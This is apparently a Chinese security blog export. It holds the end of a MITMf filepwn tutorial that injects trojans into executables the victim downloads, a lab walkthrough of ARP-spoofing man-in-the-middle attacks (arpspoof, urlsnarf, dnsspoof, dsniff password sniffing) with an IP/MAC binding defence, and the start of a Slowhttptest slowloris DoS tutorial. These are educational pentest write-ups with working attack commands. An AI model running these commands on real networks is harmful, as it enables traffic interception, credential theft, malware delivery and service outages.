<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/541CEE320BAC44CABAAA1EB69002EDC9/2661" alt="image"></p>
<h3 id="2-改写配置文件"><a href="#2-改写配置文件" class="headerlink" title="2. 改写配置文件"></a>2. 改写配置文件</h3><blockquote>
<p>gedit /usr/share/mitmf/config/mitmf.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/C0188D9FB7E44C70987E2150C2725D5A/2666" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/319EF71A78BF44D28BE76DB169073226/2673" alt="image"></p>
<h3 id="3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听"><a href="#3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听" class="headerlink" title="3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听"></a>3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof –arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-filepwn</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/AA2890664C1943EB999402A041B24051/2696" alt="image"></p>
<h3 id="4-filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序"><a href="#4-filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序" class="headerlink" title="4. filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序"></a>4. filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/D3F3F5BBFC4542C6987C331989E39E5C/2699" alt="image"></p>
<h3 id="5-之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢"><a href="#5-之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢" class="headerlink" title="5. 之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢"></a>5. 之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/E829CBB57EB74BE0AFE4CE80CCBDC83A/2701" alt="image"></p>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email-me，我们一起探讨玄学！"><a href="#emsp-emsp-经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email-me，我们一起探讨玄学！" class="headerlink" title="&emsp;&emsp;经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email me，我们一起探讨玄学！"></a>&emsp;&emsp;经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能<a href="mailto:TimeS0ng@163.com" target="_blank" rel="external">email me</a>，我们一起探讨玄学！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(序章)--中间人攻击]]></title>
      <url>/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<h2 id="0x00-MITM简介"><a href="#0x00-MITM简介" class="headerlink" title="0x00. MITM简介"></a>0x00. MITM简介</h2><h4 id="emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。"><a href="#emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。" class="headerlink" title="&emsp;&emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。"></a>&emsp;&emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。</h4><a id="more"></a>
<hr>
<h2 id="0x01-ARP协议分析"><a href="#0x01-ARP协议分析" class="headerlink" title="0x01. ARP协议分析"></a>0x01. ARP协议分析</h2><h4 id="emsp-emsp-ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！"><a href="#emsp-emsp-ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！" class="headerlink" title="&emsp;&emsp;ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！"></a>&emsp;&emsp;ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！</h4><h2 id="ARP通信过程："><a href="#ARP通信过程：" class="headerlink" title="ARP通信过程："></a>ARP通信过程：</h2><h4 id="1-首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系"><a href="#1-首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系" class="headerlink" title="1. 首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系"></a>1. 首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系</h4><h4 id="2-当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）"><a href="#2-当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）" class="headerlink" title="2. 当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）"></a>2. 当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）</h4><h4 id="3-接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP-MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个-ARP响应数据包，告诉对方自己是它需要查找的MAC地址"><a href="#3-接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP-MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个-ARP响应数据包，告诉对方自己是它需要查找的MAC地址" class="headerlink" title="3. 接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP/MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个 ARP响应数据包，告诉对方自己是它需要查找的MAC地址"></a>3. 接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP/MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个 ARP响应数据包，告诉对方自己是它需要查找的MAC地址</h4><h4 id="4-源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。"><a href="#4-源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。" class="headerlink" title="4. 源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。"></a>4. 源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。</h4><hr>
<h2 id="0x02-ARP劫持原理"><a href="#0x02-ARP劫持原理" class="headerlink" title="0x02. ARP劫持原理"></a>0x02. ARP劫持原理</h2><p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/WEBRESOURCEb7f818f776d09e9d0e00809840cb7713/2403" alt="image"></p>
<h3 id="emsp-emsp-如上图所示，中间人攻击也就是将原本正常client-lt-——-gt-server之间的通信劫持下来变成client-lt-——-gt-attacker-lt-——-gt-server-让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。"><a href="#emsp-emsp-如上图所示，中间人攻击也就是将原本正常client-lt-——-gt-server之间的通信劫持下来变成client-lt-——-gt-attacker-lt-——-gt-server-让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。" class="headerlink" title="&emsp;&emsp;如上图所示，中间人攻击也就是将原本正常client&lt;——&gt;server之间的通信劫持下来变成client&lt;——&gt;attacker&lt;——&gt;server,让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。"></a>&emsp;&emsp;如上图所示，中间人攻击也就是将原本正常client&lt;——&gt;server之间的通信劫持下来变成client&lt;——&gt;attacker&lt;——&gt;server,让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。</h3><h3 id="MITM原理"><a href="#MITM原理" class="headerlink" title="MITM原理"></a>MITM原理</h3><h4 id="1-一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御"><a href="#1-一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御" class="headerlink" title="1. 一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御"></a>1. 一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御</h4><h4 id="2-其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包"><a href="#2-其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包" class="headerlink" title="2. 其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包"></a>2. 其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包</h4><h4 id="3-欺骗网关时也是一样的，那么之后的通信就会成为client-lt-——-gt-attacker-lt-——-gt-gateway"><a href="#3-欺骗网关时也是一样的，那么之后的通信就会成为client-lt-——-gt-attacker-lt-——-gt-gateway" class="headerlink" title="3. 欺骗网关时也是一样的，那么之后的通信就会成为client&lt;——&gt;attacker&lt;——&gt;gateway"></a>3. 欺骗网关时也是一样的，那么之后的通信就会成为client&lt;——&gt;attacker&lt;——&gt;gateway</h4><hr>
<h2 id="0x03-MITM攻击实战"><a href="#0x03-MITM攻击实战" class="headerlink" title="0x03. MITM攻击实战"></a>0x03. MITM攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="1-kali-Linux"><a href="#1-kali-Linux" class="headerlink" title="1. kali Linux"></a>1. kali Linux</h4><h4 id="2-win-7靶机-emsp-IP-192-168-1-106"><a href="#2-win-7靶机-emsp-IP-192-168-1-106" class="headerlink" title="2. win 7靶机 &emsp;IP=192.168.1.106"></a>2. win 7靶机 &emsp;IP=192.168.1.106</h4><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h3 id="1-启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人"><a href="#1-启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人" class="headerlink" title="1.启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人"></a>1.启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.106 -r 192.168.1.1</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/A7F2DA5A219F4EBA88794C9D67B0E289/2465" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/F579B7E009E74BD9A555D01FB3954A88/2471" alt="image"></p>
<h3 id="2-启动urlsnarf监听靶机访问的URL"><a href="#2-启动urlsnarf监听靶机访问的URL" class="headerlink" title="2. 启动urlsnarf监听靶机访问的URL"></a>2. 启动urlsnarf监听靶机访问的URL</h3><blockquote>
<p>urlsnarf -i eth0</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/5D2C165E0F644160A05F82FAB28BA6A9/2488" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/16CD22AE35964759A840DDA351D1303B/2489" alt="image"></p>
<h3 id="3-通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）"><a href="#3-通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）" class="headerlink" title="3. 通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）"></a>3. 通过dnsspoof进行DNS欺骗（注：笔者使用这个工具时不太稳定，有时成功有时失败，但是大多数情况下都失败了，可能是我的靶机缓存有DNS记录，所以大家尽量选择没访问过的站点）</h3><blockquote>
<p>echo “192.168.1.1 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/D629EE7E17F44A9A803ACB69C033C84D/2508" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/BA103D2F3E06414A9A43642A6D56F8DF/2523" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/A1E52A5BCF1A431DBDA7328944F75AD7/2507" alt="image"></p>
<h3 id="4-通过dsniff嗅探密码"><a href="#4-通过dsniff嗅探密码" class="headerlink" title="4. 通过dsniff嗅探密码"></a>4. 通过dsniff嗅探密码</h3><p>dsniff -cm</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/2D8DEC9950A544348C5477C423AFBC5A/2530" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/8D9B375121464E8D831303CE165B76ED/2531" alt="image"></p>
<hr>
<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04. 防御措施"></a>0x04. 防御措施</h2><h4 id="emsp-emsp-关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。"><a href="#emsp-emsp-关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。" class="headerlink" title="&emsp;&emsp;关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。"></a>&emsp;&emsp;关于中间人的利用就介绍到这里吧，大家可以自行Google一下其他的工具，下面介绍一下防御方法。基于ARP的中间人攻击只需要在网关上设置IP／MAC绑定就能杜绝了，其实原理很简单，这就是上面我给大家介绍ARP原理的原因。</h4><p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/B93990F9060945D6A979792AFE2BFB69/2542" alt="image"></p>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-祝大家国庆快乐！！"><a href="#emsp-emsp-祝大家国庆快乐！！" class="headerlink" title="&emsp;&emsp;祝大家国庆快乐！！"></a>&emsp;&emsp;祝大家国庆快乐！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Slowhttptest]]></title>
      <url>/2017/09/29/Slowhttptest/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Slowhttptest简介"><a href="#0x00-Slowhttptest简介" class="headerlink" title="0x00. Slowhttptest简介"></a>0x00. Slowhttptest简介</h2><h4 id="emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。"><a href="#emsp-emsp-Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式-slowloris、slow-http-post、slow-read-attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。" class="headerlink" title="&emsp;&emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。"></a>&emsp;&emsp;Slowhttptest其实是一个DoS压力测试工具，它集成有三种慢速攻击模式(slowloris、slow http post、slow read attack），并且能导出日志报告，节约了部分写文档的时间，是一个特别好用且强大的工具，下面笔者将逐个分析它主要的攻击模式及防御方法。</h4><a id="more"></a>
<hr>
<h2 id="0x01-Slowhttptest安装"><a href="#0x01-Slowhttptest安装" class="headerlink" title="0x01. Slowhttptest安装"></a>0x01. Slowhttptest安装</h2><h3 id="1-Mac安装命令"><a href="#1-Mac安装命令" class="headerlink" title="1. Mac安装命令"></a>1. Mac安装命令</h3><blockquote>
<p>brew update &amp;&amp; brew install slowhttptest</p>
</blockquote>
<h3 id="2-linux安装命令"><a href="#2-linux安装命令" class="headerlink" title="2.linux安装命令"></a>2.linux安装命令</h3><blockquote>
<p>apt-get update &amp;&amp; apt-get install slowhttptest</p>
</blockquote>
<h3 id="安装好Slowhttptest之后可以直接执行命令-Slowhttptest-检测是否成功安装-下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究"><a href="#安装好Slowhttptest之后可以直接执行命令-Slowhttptest-检测是否成功安装-下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究" class="headerlink" title="[*]安装好Slowhttptest之后可以直接执行命令 Slowhttptest 检测是否成功安装,下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究"></a>[*]安装好Slowhttptest之后可以直接执行命令 Slowhttptest 检测是否成功安装,下面截图是笔者Mac上装的Slowhttptest。大家也可以利用GitHub安装，有兴趣的可以自己研究</h3><blockquote>
<p>git clone <a href="https://github.com/shekyan/slowhttptest" target="_blank" rel="external">https://github.com/shekyan/slowhttptest</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/fd2a33c96b9948cf7a2edb4950c6f04f/xmlnote/B1E7D4EE813A432CA0E8C10F5BBA6B83/1993" alt="image"></p>
<hr>
<h1 id="0x02-Slowloris模式"><a href="#0x02-Slowloris模式" class="headerlink" title="0x02. Slowloris模式"></a>0x02. Slowloris模式</h1><h2 id="Slowloris攻击原理："><a href="#Slowloris攻击原理：" class="headerlink" title="Slowloris攻击原理："></a><strong>Slowloris</strong>攻击原理：</h2><h4 id="1-Slowloris也称为slow-headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击"><a href="#1-Slowloris也称为slow-headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击" class="headerlink" title="1. Slowloris也称为slow headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击"></a>1. Slowloris也称为slow headers，是通过耗尽server的并发连接池来达到攻击目的的一种DoS攻击方式，这和前面讲的Syn-Flood有点相似，不过Slowloris是应用层的攻击</h4><h4 id="2-正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时"><a href="#2-正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时" class="headerlink" title="2. 正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时"></a>2. 正常情况下当client和server通信时，client发送的header请求头信息的结尾应该是”0d0a0d0a”。但是如果启用Slowloris这种模式则只会发送”0d0a”，而HTTP协议默认在服务器接收到全部信息之后才会开始处理，如果始终没有接收到完整的request信息那么服务器会为其保留连接池并持续等待后续信息直到连接超时</h4><h4 id="3-通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果"><a href="#3-通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果" class="headerlink" title="3. 通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果"></a>3. 通常配置不太好的的服务器的并发连接池数并不多，当攻击者连续不间断的建立连接并占满server的连接池资源之后，server就不能为正常用户提供服务，达到DoS攻击效果</h4><h3 id="如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"><a href="#如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS" class="headerlink" title="[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS"></a>[*]如果对上述原理不太理解，笔者给大家描述一个生活中常见的场景：当大家在麦当劳点餐的时候，最前面点餐的那个人点了一个汉堡，然后他还准备点其他东西，但是又一直不说要啥，就一直霸站着收银台导致后面的客人无法点餐，如果德克士的每个收银台都被这样的客人霸占着，那么最后就会导致麦当劳无法做生意了，也就造成了DoS</h3><hr>
<h2 id="Slowloris攻击实战"><a href="#Slowloris攻击实战" class="headerlink" title="Slowloris攻击实战"></a><strong>Slowloris</strong>攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="1-Mac端的Slowhttptest"><a href="#1-Mac端的Slowhttptest" class="headerlink" title="1. Mac端的Slowhttptest"></a>1. Mac端的Slowhttptest</h4><h4 id="2-靶机metasploitable-2-0-emsp-IP-192-168-1-103"><a href="#2-靶机metasploitable-2-0-emsp-IP-192-168-1-103" class="headerlink" title="2. 靶机metasploitable 2.0 &emsp;IP=192.168.1.103"></a>2. 靶机metasploitable 2.0 &emsp;IP=192.168.1.103</h4><h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><blockquote>
<p>ulimit -n 1024 &amp;&amp; slowhttptest -c 1000 -H -g -o /Users/apple1/Desktop/my_header_stats -i 10 -r 100 -t GET -u <a href="https://host.example.com/index.html" target="_blank" rel="external">https://host.example.com/index.html</a> -x 24 -p 3</p>
